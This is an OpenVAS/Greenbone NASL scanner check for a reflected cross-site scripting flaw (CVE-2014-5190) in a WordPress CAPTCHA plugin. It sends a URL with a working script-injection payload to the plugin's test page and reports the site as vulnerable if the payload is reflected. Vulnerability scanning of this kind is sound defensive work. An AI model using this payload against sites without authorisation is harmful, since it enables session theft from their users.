# SPDX-FileCopyrightText: 2014 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804816");
  script_version("2023-10-27T05:05:28+0000");
  script_cve_id("CVE-2014-5190");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"2023-10-27 05:05:28 +0000 (Fri, 27 Oct 2023)");
  script_tag(name:"creation_date", value:"2014-08-19 18:46:50 +0530 (Tue, 19 Aug 2014)");
  script_name("WordPress SI CAPTCHA Anti-Spam Plugin Cross Site Scripting Vulnerability");

  script_tag(name:"summary", value:"WordPress SI CAPTCHA Anti-Spam Plugin is prone to a cross-site scripting (XSS) vulnerability.");
  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET request and check whether it is able to read
cookie or not.");
  script_tag(name:"insight", value:"Input passed to si-captcha-for-wordpress/captcha-secureimage/test/index.php
script via the URL is not validated before returning it to users.");
  script_tag(name:"impact", value:"Successful exploitation will allow remote attacker to execute arbitrary script
code in a user's browser session within the trust relationship between their
browser and the server.");
  script_tag(name:"affected", value:"WordPress SI CAPTCHA Anti-Spam plugin version 2.7.4");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"solution_type", value:"WillNotFix");

  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/95104");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/69011");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/127723");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_analysis");
  script_copyright("Copyright (C) 2014 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_wordpress_http_detect.nasl");
  script_mandatory_keys("wordpress/http/detected");
  script_require_ports("Services/www", 80);
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

url = dir + "/wp-content/plugins/si-captcha-for-wordpress/captcha-secureima" +
            'ge/test/index.php/"/><script>alert(document.cookie);</script>' ;

if(http_vuln_check(port:port, url:url, check_header:TRUE,
   pattern:"<script>alert\(document\.cookie\);</script>",
   extra_check:">CAPTCHA PHP Requirements Test<"))
{
  report = http_report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}
